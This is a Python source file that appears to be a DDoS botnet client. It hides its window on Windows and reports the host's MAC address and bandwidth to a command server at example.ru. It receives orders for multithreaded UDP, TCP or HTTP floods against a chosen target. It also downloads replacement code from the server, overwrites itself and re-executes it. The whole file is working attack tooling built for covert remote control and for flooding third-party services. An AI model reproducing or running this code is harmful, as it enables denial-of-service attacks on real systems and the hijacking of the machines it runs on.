# 4
import os
from dataclasses import dataclass

if os.name == 'nt':
    try:
        import win32gui
        import win32con
    except:
        os.system('pip install win32gui')
        os.system('pip install pypiwin32')
        import win32gui
        import win32con

    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

import json
import re
import socket
import time
import requests
import threading

try:

    import speedtest

except ImportError:

    os.system('pip install speedtest-cli')

    os.system('pip3 install speedtest-cli')

    import speedtest

from uuid import getnode as get_mac

SITE = 'http://example.ru/api'

REGEXP_IP = r'^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$'

while True:
    try:
        st = speedtest.Speedtest(secure=True)
        break
    except:
        time.sleep(1.5)


def humansize(nbytes: float) -> str:
    suffixes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']

    i = 0
    while nbytes >= 1024 and i < len(suffixes) - 1:
        nbytes /= 1024.

        i += 1

    f = ('%.2f' % nbytes).rstrip('0').rstrip('.')
    return '%s %s' % (f, suffixes[i])


@dataclass
class Attack:
    attack_id: int = -1
    status_attack: bool = False
    thread_counter: int = 0
    internet_speed: int = 0


def attack(*, host: str = '', port: str = '',
           method: str = 'GET', msg_tcp_udp: str = '',
           timeout: float) -> None:
    attack_id = Attack.attack_id

    while Attack.status_attack:
        if attack_id != Attack.attack_id:
            return

        try:
            if re.match(REGEXP_IP, host):

                if method == 'udp':

                    sock = socket.socket(socket.AF_INET,

                                         socket.SOCK_DGRAM)  # UDP

                    sock.sendto(msg_tcp_udp.encode(), (host, int(port)))

                else:

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    s.connect((host, int(port)))

                    s.sendall(msg_tcp_udp.encode())

                    s.close()

            else:

                requests.request(method, host)

        except:
            pass

        time.sleep(timeout)


def smart_attack(attack_data: dict) -> None:
    internet_speed = Attack.internet_speed / 1024 / 1024
    thread_amount = internet_speed / 100 * int(attack_data['percent']) * 15

    base_attack(attack_data, int(thread_amount))


def base_attack(attack_data: dict, max_thread: int = 0) -> None:
    if not max_thread:
        max_thread = int(attack_data['max_thread'])

    attack_id = Attack.attack_id
    while Attack.thread_counter <= max_thread and Attack.status_attack and attack_id == Attack.attack_id:
        kwargs = {
            'method': attack_data['method'],
            'host': attack_data['host'],
            'port': attack_data['port'],
            'msg_tcp_udp': attack_data['msg_tcp_udp'],
            'timeout': float(attack_data['timeout']) / 1000,
        }
        thread = threading.Thread(target=attack, kwargs=kwargs)
        thread.start()

        Attack.thread_counter += 1


def router(attack_data: dict) -> None:
    if attack_data['smart']:
        smart_attack(attack_data)
    else:
        base_attack(attack_data)


def attack_controller() -> None:
    Attack.internet_speed = st.upload()

    requests.get(f'{SITE}/checkin/{get_mac()}/{Attack.internet_speed}')

    attack_data = json.loads(requests.post(f'{SITE}/attack').text)

    if not attack_data['status']:
        Attack.status_attack = False

        Attack.attack_id = -1
        return

    if attack_data['id'] == Attack.attack_id:
        return

    else:

        Attack.status_attack = False

        time.sleep(10)
    Attack.attack_id = attack_data['id']

    Attack.status_attack = True

    router(attack_data)

    time.sleep(5)


def check_update_code() -> None:
    actual_code = json.loads(requests.get(f'{SITE}/get_code').text)['code']

    with open('system.py', 'r', encoding='utf-8') as file:

        actual_code_split = actual_code.split('\n')[0]
        if actual_code_split.replace('\r', '') != file.read().split('\n')[0]:

            with open('system.py', 'w', encoding='utf-8') as f:
                f.write(actual_code)

            attack_data = json.loads(requests.post(f'{SITE}/attack').text)

            Attack.status_attack = False

            if attack_data['status']:
                Attack.attack_id = attack_data['id']

            if os.name == 'nt':
                os.system('python system.py')

            else:
                os.system('python3 system.py')
            time.sleep(10000)
    time.sleep(15)


def main() -> None:
    while True:
        try:
            check_update_code()
            attack_controller()
        except:
            pass


if __name__ == '__main__':
    main()
